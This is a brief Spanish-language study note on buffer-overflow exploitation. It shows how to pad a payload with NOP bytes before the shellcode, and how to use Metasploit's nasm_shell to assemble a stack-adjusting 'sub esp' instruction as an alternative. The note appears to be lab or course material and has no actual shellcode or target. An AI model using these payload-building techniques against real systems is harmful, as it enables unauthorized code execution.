___
- tags: #buffer_overflow #shell_code #nop #
___
## NOPs - No Operation Code
Operaciones de descanso

### Asignamos nops para darle tiempo para que interprete la shell
```python
# b"\x90" -> nops
payload = before_eip + eip + b"\x90" * 16 + shellcode
```


## Alternativa al NOPs
### Desplazamiento de la pila
```shell
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
nasm > sub esp,0x10
00000000  83EC10            sub esp,byte +0x10
```

### Añadimos el 83EC10 al script .py
```python
payload = before_eip + eip + b"\x83\xEC\x10" * 16 + shellcode
```